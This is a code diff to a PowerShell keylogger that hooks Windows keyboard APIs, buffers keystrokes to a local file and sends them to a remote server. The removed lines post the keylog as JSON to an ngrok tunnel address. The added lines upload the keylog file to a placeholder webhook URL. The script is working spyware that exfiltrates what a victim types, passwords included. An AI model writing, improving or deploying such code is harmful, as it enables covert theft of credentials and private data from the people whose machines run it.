@@ -1,4 +1,3 @@
-
 # Signatures for Windows API calls
 $signatures = @'
     [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
@@ -19,9 +18,9 @@ if ($null -eq $API) {
     exit
 }
 
-$uri = "https://eba2-60-243-45-209.ngrok-free.app"
-$headers = @{"Content-Type" = "application/json"}
-$outputFilePath = "C:\Users\keylog.txt"
+# Set the webhook URL
+$webhookUri = "https://your-webhook-url.com"  # Replace with your actual webhook URL
+$outputFilePath = "C:\Users\keylog1.txt"
 $keyCount = 0
 $keyBuffer = @()
 $startTime = Get-Date
@@ -73,11 +72,9 @@ while ($true) {
                     $keyCount = 0
                     $keyBuffer = @()
 
-                    # Send data to URI
-                    $body = @{"keylog" = $keyBufferString} | ConvertTo-Json
-
-                    Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body $body
-                    Write-Host "Data sent to URI."
+                    # Send data to webhook URI
+                    Invoke-WebRequest -Uri $webhookUri -Method POST -InFile $outputFilePath
+                    Write-Host "Data sent to webhook."
                 }
             }
         }
